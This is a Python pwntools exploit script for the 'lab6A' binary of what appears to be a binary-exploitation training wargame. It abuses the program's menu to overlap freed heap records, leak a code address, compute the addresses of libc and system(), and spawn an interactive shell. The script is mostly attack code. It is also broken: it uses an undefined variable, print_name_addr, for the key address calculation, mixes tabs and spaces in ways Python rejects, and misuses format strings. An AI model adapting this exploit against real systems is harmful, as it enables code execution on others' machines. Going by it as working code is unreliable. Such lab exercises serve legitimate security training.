# Based on https://github.com/ewilded/MBE-snippets/blob/master/LAB6A/exploit.py
from pwn import *
import sys

settings = {

    # Path to binary
    "binary"        : "/levels/lab06/lab6A",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():
    p = process(binary.path)
    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    # Chose action 1 (Make a number to propagate the big_num/small_num pointer to the right place on the heap).
    p.sendlineafter("Enter Choice: ", "2")  
    p.recvuntil("Input number to store: ")		
    p.sendline("1337")
	
    # Delete the number to free up the space for our new string.
    p.recvuntil("Enter Choice: ")
    p.sendline("4")

    # Make a string to propagate the big_str/small_str pointer to the right place.
    p.recvuntil("Enter Choice: ")  
    p.sendline("1")	
    p.sendlineafter("Input string to store: ", "fuck")
	
    # OK, now let's print the 'number'
    p.recvuntil("Enter Choice: ")
    p.sendline("7")

    p.sendlineafter("Number index to print: ","1")
	#sample output: not 1337 enough: 3078216647
    # Analyze the leak (we have to introduce a way to distinguish when the execution was successful as opposed to when we crashed the thing due to the lack of lack with ASLR and our fixed 0xb halfbyte).
    try:
        leak = p.recv()
	
    except EOFError:
	    sys.exit(1)

    small_num_addr = int(str(leak[0xa:0x1a])) # bytes 17:26 contain the number
    print("small_num()'s current address: %x", hex(small_num_addr))
	
    # Calculate the base of the code segment:
    base_code = print_name_addr & 0xfffff000
    print("Leaked address base of the code segment: %x", hex(base_code))	
	
    # Calculate the base of the data segment:
    base_libc = base_code + 0x1dd000
    print("Calculated base of the libc code segment: %x", hex(base_libc))
    
    # Calculate the address of system()
    system_addr = base_libc + 0x40190
    print("Calculated address of system@libc: %x", hex(system_addr))
	
    # OK, it's time to get our shell
    print("OK, let's get our shell")
    # 1. create a string ("sh")
    # 2. 'remove' the string
    # 3. create a number (system's() address)
	# 4. 'print' the string
    p.sendline("0") # to make sure we call up the 'Enter choice' menu again:
    p.sendlineafter("Enter Choice: ","1")
    p.sendlineafter("Input string to store: ","sh")
	
	p.sendlineafter("Enter Choice: ","3")
	p.sendlineafter("Enter Choice: ","2")
	p.sendlineafter("Input number to store: ",str(system_addr))
	
    p.sendlineafter("Enter Choice: ","5")
	
    p.interactive()
	
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])

    exploit()
